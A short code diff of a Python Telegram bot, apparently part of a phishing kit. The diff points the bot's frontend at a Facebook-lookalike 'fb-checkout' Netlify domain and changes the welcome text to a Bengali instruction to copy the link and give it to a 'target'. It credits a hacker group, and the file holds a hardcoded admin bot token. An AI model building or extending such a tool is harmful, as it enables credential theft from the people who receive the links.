@@ -24,7 +24,7 @@ ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8218726690:AAHMwmdce9LJA1GP
 ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "1849126202")
 
 # Frontend Netlify URL
-FRONTEND_BASE = "https://beamish-speculoos-1994d0.netlify.app"
+FRONTEND_BASE = "fb-checkout.netlify.app"
 USERS_FILE = "users.json"
 # -------------------------
 
@@ -83,11 +83,11 @@ def telegram_webhook():
             reg_url = make_register_url(chat_id)
             welcome = (
                 "🤖 *Welcome to Phanhom Bot!*\n\n"
-                "Please register or login using the link below 👇\n"
+                "লিংকট কপি করো এবং তোমার target কে দেও !! 👇\n"
                 f"🔗 {reg_url}\n\n"
-                "👨‍💻 *Developer:* [@noobxvau](https://t.me/noobxvau)\n"
+                "👨‍💻 *Bot Developer:* [@noobxvau](https://t.me/noobxvau)\n"
                 "💬 *Join our official group for more updates:*\n"
-                "👉 [@noobhackerbd](https://t.me/noobhackerbd)"
+                "👉 [NOOB HACKER BD](https://t.me/+ENYrQ5N9WNE3NWQ9)"
             )
             send_message(chat_id, welcome)
 
